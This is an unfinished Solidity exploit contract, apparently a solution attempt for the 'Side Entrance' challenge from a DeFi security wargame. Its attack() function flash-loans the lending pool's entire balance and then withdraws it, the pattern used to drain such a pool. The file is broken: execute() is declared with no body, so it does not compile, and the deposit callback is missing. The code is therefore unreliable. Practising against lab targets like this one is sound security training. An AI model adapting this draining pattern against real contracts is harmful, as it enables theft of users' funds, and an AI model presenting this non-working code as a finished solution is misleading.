// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./SideEntranceLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract LenderHack {

    SideEntranceLenderPool pool;

    constructor (address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    function attack() public {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
    }

    function execute() 


}

